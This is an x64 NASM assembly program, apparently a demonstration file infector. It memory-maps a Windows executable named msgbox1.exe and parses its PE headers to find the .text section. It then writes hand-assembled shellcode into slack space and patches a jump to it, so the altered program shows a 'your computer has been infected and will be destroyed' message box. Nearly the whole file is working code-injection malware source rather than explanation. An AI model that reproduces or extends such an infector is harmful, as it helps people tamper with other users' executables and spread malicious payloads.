[BITS 64]

%include "nasmx.inc"
%include "win32/kernel32.inc"
%include "win32/windows.inc"

SECTION .data

filename            db "msgbox1.exe", 0
text_section_name   db ".text"
msgbox_title        db "DIE DIE DIE", 0
msgbox_text         db "your computer has been infected and will be destroyed", 0

SECTION .text

extern CreateFile
extern CreateFileMapping
extern MapViewOfFile
extern UnmapViewOfFile
extern CloseHandle
extern ExitProcess

extern GetLastError

PAGE_READWRITE  equ 4

open_exe:
    push    rbp
    mov     rbp, rsp
;; CreateFile
    mov     rcx, filename
    mov     rdx, GENERIC_READ | GENERIC_WRITE
    xor     r8, r8
    xor     r9, r9
    push    0
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    sub     rsp, 20h
    call    CreateFile
    mov     rsp, rbp
    cmp     rax, INVALID_HANDLE_VALUE
    je      .fail
    push    rax
;; CreateFileMapping
    mov     rcx, rax
    xor     rdx, rdx
    mov     r8, PAGE_READWRITE
    xor     r9, r9
    push    0
    push    0
    sub     rsp, 20h
    call    CreateFileMapping
    add     rsp, 30h
    or      rax, 0
    jz      .fail
;; MapViewOfFile
    mov     rcx, rax
    mov     rdx, FILE_MAP_WRITE
    xor     r8, r8
    xor     r9, r9
    push    0
    sub     rsp, 20h
    call    MapViewOfFile
    add     rsp, 28h
    or      rax, 0
    jz      .fail
    push    rax
    xor     rax, rax
    jmp     .ret
.fail:
    call    GetLastError
    mov     rax, 1
.ret:
    pop     rdx
    pop     rcx
    mov     rsp, rbp
    pop     rbp
    ret

close_exe:
    push    rbp
    mov     rbp, rsp
    push    rcx
    mov     rcx, rdx
    sub     rsp, 20h
    call    UnmapViewOfFile
    add     rsp, 20h
    or      al, 0
    pop     rcx
    jz      .fail
    sub     rsp, 20h
    call    CloseHandle
    add     rsp, 20h
    or      al, 0
    jz      .fail
    xor     rax, rax
    jmp     .ret
.fail:
    mov     rax, 1
.ret:
    mov     rsp, rbp
    pop     rbp
    ret

get_code_addr:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rcx
    mov     rbx, rcx
    xor     rax, rax
    mov     eax, [rbx + 03Ch]
    mov     edx, [rbx + rax]
    cmp     edx, 00004550h              ;; check PE signature
    jne     .fail
    add     eax, 4                      ;; COFF file header
    mov     cx, [rbx + rax + 2]         ;; number of sections
    movzx   edx, word [rbx + rax + 10h] ;; optional header size
    add     eax, 14h                    ;; COFF optional header
    add     eax, edx                    ;; sections
    cld
.locate_text:
    mov     r8, rax
    push    rcx
    movzx   rax, cx
    dec     rax
    mov     cx, 28h
    mul     cx
    add     rax, r8
    lea     rdi, [rbx + rax]
    mov     rsi, text_section_name
    mov     ecx, 5
    repe cmpsb
    pop     rcx
    mov     rax, r8
    je      .text_found
    loop    .locate_text
    jmp     .fail
.text_found:
    add     rbx, rax    ;; sections base
    add     rbx, 14h    ;; raw data ptr offset
    mov     ax, cx
    dec     ax
    mov     cx, 28h
    mul     cx
    movzx   rax, ax
    mov     rax, [rbx + rax]    ;; raw data ptr
    pop     rbx
    add     rax, rbx
    jmp     .ret
.fail:
    mov     rax, 0
.ret:
    pop     rbx
    mov     rsp, rbp
    pop     rbp
    ret

inject_msgbox:
    push    rbp
    mov     rbp, rsp
    push    rbx
    mov     rbx, rcx
    mov     rdx, rcx
    xor     rcx, rcx
.locate:
    or      qword [rbx + rcx], 0
    jz      .loc_found
    inc     cl
    jmp     .locate
.loc_found:
    add     cl, 8
    mov     rax, rbx
    add     rbx, rcx
    push    rbx
    ; jmp 00401002
    neg     cl
    mov     byte [rbx], 0EBh
    mov     [rbx + 1], cl
    add     rbx, 2
    ; jmp injected code
    neg     cl
    add     cl, 12
    add     cl, 54
    add     cl, 4
    mov     [rax + 1], cl
    ; load msgbox_title
    mov     ecx, 12
    mov     rsi, msgbox_title
    mov     rdi, rbx
    rep movsb
    add     rbx, 12
    ; load msgbox_text
    mov     ecx, 54
    mov     rsi, msgbox_text
    mov     rdi, rbx
    rep movsb
    add     rbx, 54
    ; get_eip trick
    ; mov   eax, [esp]
    mov     byte [rbx + 0], 8Bh
    mov     word [rbx + 1], 2404h
    add     rbx, 3
    ; ret
    mov     byte [rbx], 0C3h
    inc     rbx
    ; call get_eip
    mov     byte [rbx + 0], 0E8h
    mov     dword [rbx + 1], 0FFFFFFF7h
    add     rbx, 5
    ; push 0
    mov     word [rbx], 006Ah
    add     rbx, 2
    ; sub eax, 4B (msgbox_title)
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0E8h
    mov     byte [rbx + 2], 4Bh
    add     rbx, 3
    ; push eax
    mov     byte [rbx], 50h
    inc     rbx
    ; add eax, 12 (msgbox_text)
    mov     byte [rbx + 0], 83h
    mov     byte [rbx + 1], 0C0h
    mov     byte [rbx + 2], 0Ch
    add     rbx, 3
    ; push eax
    mov     byte [rbx], 50h
    inc     rbx
    ; push 0
    mov     word [rbx], 006Ah
    add     rbx, 2
    ; call MessageBoxA
    mov     byte [rbx], 0E8h
    add     rdx, 1Ch
    mov     rax, rbx
    add     rax, 5
    sub     rax, rdx
    neg     eax
    mov     [rbx + 1], eax
    add     rbx, 5
    ; jmp jumper to 00401002
    pop     rcx
    mov     rax, rbx
    add     rax, 2
    sub     rax, rcx
    neg     al
    mov     byte [rbx], 0EBh
    mov     [rbx + 1], al
    pop     rbx
    mov     rsp, rbp
    pop     rbp
    ret

global _start
_start:
;; Load EXE
    call    open_exe
    or      rax, 0
    jnz     .fail
    push    rcx
    push    rdx
;; Inject msg box
    mov     rcx, rdx
    call    get_code_addr
    or      rax, 0
    jz      .fail
    mov     rcx, rax
    call    inject_msgbox
;; Unload EXE
    pop     rdx
    pop     rcx
    call    close_exe
    or      al, 0
    jnz     .fail
    mov     rcx, 0
    jmp     .end
.fail:
    mov     rcx, 1
.end:
    add     rsp, 10h
    call    ExitProcess
